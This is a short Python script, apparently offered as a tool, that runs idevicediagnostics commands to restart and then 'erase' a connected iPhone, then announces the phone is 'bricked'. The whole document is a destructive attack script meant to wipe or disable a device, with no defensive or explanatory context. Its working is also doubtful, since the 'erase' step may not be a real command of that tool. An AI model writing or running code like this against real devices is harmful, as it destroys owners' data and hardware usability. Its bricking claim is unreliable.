import os  

def brick():  
    os.system("idevicediagnostics restart")  
    os.system("idevicediagnostics erase")  
    print("[+] iPhone bricked.")  

if __name__ == "__main__":  
    brick()  
